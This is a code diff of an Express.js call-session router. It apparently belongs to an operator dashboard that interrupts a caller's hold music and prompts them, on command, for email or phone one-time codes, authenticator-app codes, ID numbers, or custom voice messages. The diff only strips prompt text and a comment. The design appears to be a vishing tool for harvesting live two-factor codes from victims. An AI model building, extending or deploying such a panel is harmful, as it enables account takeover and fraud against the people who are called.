@@ -8,31 +8,25 @@ router.post('/request-action/:sessionId', async (req, res) => {
     const io = req.app.get('io');
     
     let currentAction = '';
-    let actionMessage = '';
     
     switch(action) {
         case 'email_otp':
             currentAction = 'waiting_for_email_otp';
-            actionMessage = 'Please enter the OTP sent to your email followed by the pound key.';
             break;
         case 'auth_otp':
             currentAction = 'waiting_for_auth_otp';
-            actionMessage = 'Please enter the code from your authenticator app followed by the pound key.';
             break;
         case 'phone_otp':
             currentAction = 'waiting_for_phone_otp';
-            actionMessage = 'Please enter the OTP sent to your phone followed by the pound key.';
             break;
         case 'id_number':
             currentAction = 'waiting_for_id';
-            actionMessage = 'Please enter your ID number followed by the pound key.';
             break;
         default:
             return res.status(400).json({ error: 'Invalid action' });
     }
     
     try {
-        // Update the session action - this interrupts the music
         await db.query(
             `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
             [currentAction, sessionId]
@@ -43,12 +37,7 @@ router.post('/request-action/:sessionId', async (req, res) => {
             [sessionId, action]
         );
         
-        // Emit to dashboard
-        io.emit('admin_action', { 
-            session_id: sessionId, 
-            action: action,
-            message: actionMessage 
-        });
+        io.emit('admin_action', { session_id: sessionId, action: action });
         
         res.json({ success: true, action: action });
     } catch (error) {
@@ -73,11 +62,7 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
             [sessionId, 'custom_voice', message]
         );
         
-        io.emit('admin_action', { 
-            session_id: sessionId, 
-            action: 'custom_voice', 
-            message: message 
-        });
+        io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
         
         res.json({ success: true, message: 'Custom voice command sent' });
     } catch (error) {
